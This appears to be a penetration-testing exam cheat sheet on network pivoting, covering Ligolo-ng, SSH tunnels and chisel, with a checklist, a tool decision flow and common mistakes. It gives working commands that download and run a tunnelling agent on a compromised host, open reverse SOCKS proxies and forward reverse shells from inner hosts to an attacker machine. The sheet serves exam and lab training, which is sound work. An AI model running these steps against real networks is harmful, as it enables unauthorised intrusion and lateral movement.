SCOPE · NETWORK PIVOTING

goal: reach inner subnets from Kali through a compromised host · preferred tool: Ligolo-ng (TUN mode, no proxychains) · fallback: chisel + proxychains · ssh tunnels · netsh portproxy · EXAM RULE: Metasploit cannot pivot — MSF limited to ONE target machine total
[ 00 ] METHODOLOGY CHECKLIST · PIVOTING
click to mark done · exact order matters — out of order = silent failures

The exact order matters. Doing the right steps out of order means tools fail silently — usually because you forgot ip route add after starting the proxy. Ligolo is the standard. SSH tunnel if linux victim and no upload possible. Chisel as fallback.

▸ 0. PREP — on Kali, once (persistent across reboots)
  • Create tun interface — sudo ip tuntap add user $USER mode tun ligolo
  • Bring up — sudo ip link set ligolo up
  • Confirm — ip link show ligolo → state UP
  • Have agent + proxy binaries ready — ls ~/tools/ligolo/ (proxy + agent + agent.exe)
  • Serve binaries — python3 -m http.server 80 from tools dir
▸ 1. RECON — on compromised host, before starting tunnel
  • Get inner subnet — ipconfig /all (Win) or ip a (Lin) → note non-tun0 subnet
  • Quick inner sweep from hop — for /l %i in (1,1,254) do ping -n 1 -w 50 192.168.x.%i >nul && echo 192.168.x.%i
  • Or: upload and run ./nmap -sT -Pn -p 22,445,5985 192.168.x.0/24 (static nmap)
▸ 2. LIGOLO TUNNEL — Windows victim (preferred)
  • Start proxy on Kali — ./proxy -selfcert -laddr 0.0.0.0:11601
  • Transfer agent.exe to victim — via evil-winrm: upload agent.exe or iwr http://<KALI>/agent.exe -outfile agent.exe
  • Run agent — .gent.exe -connect <KALI>:11601 -ignore-cert
  • In proxy CLI — session → pick agent → tunnel_start --tun ligolo
  • Add route on Kali — sudo ip route add <inner-subnet>/24 dev ligolo
  • Verify — ip route | grep ligolo
▸ 3. VERIFY TUNNEL — before doing anything else
  • TCP-only scan — nmap -sT -Pn -p 22,80,443,445,5985 <inner-IP> (NOT -sS — ICMP/raw needs root on ligolo)
  • Test SMB — smbclient -L //<inner-IP> -N 2>/dev/null
  • Test WinRM — nxc winrm <inner-IP> -u <user> -p <pwd>
  • If no response — check route: ip route show table 100 · check proxy: ./proxy -selfcert shows agent connected · check agent: ps aux | grep agent on victim still running
▸ 4. REVERSE SHELL FROM INNER HOST → KALI
  • Inner host cannot reach Kali directly — use ligolo listener
  • In proxy CLI — listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443
  • Listen on Kali — nc -nvlp 443
  • Inner host connects to hop's IP on :443 → ligolo forwards to Kali:443
  • Payload: LHOST=<hop-IP> LPORT=443 (not Kali IP!)
▸ 5. SSH TUNNEL — Linux victim, no binary upload
  • Dynamic SOCKS (forward proxy from Kali) — ssh -D 1080 -N <user>@<hop-IP>
  • Set proxychains — edit /etc/proxychains4.conf: socks5 127.0.0.1 1080
  • Use — proxychains nxc smb <inner-IP> -u <u> -p <p>
  • Remote forward (shell from inner to Kali) — ssh -R 443:127.0.0.1:443 <KALI-user>@<KALI> (run from hop)
  • Local forward (reach inner port from Kali) — ssh -L 8080:<inner-IP>:80 <user>@<hop-IP>
▸ 6. CHISEL — fallback (AV flags ligolo)
  • Kali server — ./chisel server --reverse --port 8000
  • Victim client — .\chisel.exe client <KALI>:8000 R:socks
  • Gives SOCKS5 on Kali 127.0.0.1:1080 → use with proxychains
▸ 7. CLEANUP — before exam submission
  • Remove route — sudo ip route del <inner-subnet>/24 dev ligolo
  • Stop tunnel in proxy CLI — tunnel_stop
  • Kill agent — taskkill /f /im agent.exe or kill $(pgrep agent)
  • Delete agent binary — del agent.exe or rm agent
  • Confirm ligolo interface down — ip link show ligolo
budget: 10–15 min for first tunnel · 5 min for each subsequent hop
LHOST for inner shells = hop IP, not Kali — set the ligolo listener first
Metasploit single-target rule = NO MSF pivoting on AD machines
[ 01 ] DECISION FLOW · WHICH TUNNEL?
TRIGGER · "can't reach inner host"

Pick a tool based on the victim platform and what's already installed. Ligolo is the default for Windows compromise. SSH tunnels work natively when you've popped Linux. Chisel is the fallback when ligolo binary is flagged. Native Windows portproxy works when nothing else can be uploaded.

[ ⚠ ] ANTI-PATTERNS
Forget ip route add after tunnel_start
Tunnel is up, tools hang or hit Kali's default gateway. Always: tun → proxy → agent → start → route add. Forgetting this is the #1 ligolo failure.
Use nmap -sS (SYN scan) through any tunnel
SYN scan needs raw sockets; user-mode tunnels can't pass them. Always -sT (TCP connect) through ligolo, chisel, proxychains. Add -Pn too — ping won't work either.
Use Metasploit to pivot on the AD set
Exam rule: Metasploit on ONE target machine only. Pivoting = using on multiple = disqualifying. Use ligolo or SSH tunnels. Save MSF for a standalone.
Run ligolo agent without -ignore-cert
Self-signed cert from proxy -selfcert won't validate. Always: agent.exe -connect <KALI>:11601 -ignore-cert or it dies silently.
Try xfreerdp /v:<inner-IP> without route added
Kali doesn't know how to reach inner subnet without route. RDP from member1 directly, or set up route + xfreerdp through tun.
Forget Kerberos clock skew when pivoting to DC
Pivoting adds latency. If Kali clock drifts >5min from DC: KRB_AP_ERR_SKEW. Always sudo rdate -n <DC> after tunnel is up.
Use one giant -D SSH tunnel + proxychains for everything
proxychains is slow and unreliable for nmap/BloodHound. Ligolo TUN mode is 10x faster. If stuck with SSH, do per-port -L forwards for the specific service.
Leave the agent + listener running after exam
Graders penalize lingering tunnels. Stop tunnel, delete agent binary, remove route. Document the cleanup steps in the report.
Run nmap full-port scan through proxychains
It will literally take hours. Through pivot: targeted ports only (445, 5985, 88, 3389, 80, 443) with -T4. Full port scans on direct-reachable targets only.
Trust your route table without testing
ip route | grep ligolo confirms route exists but not that traffic flows. Always verify with nmap -sT -p 445 <inner-IP> before assuming the tunnel works.
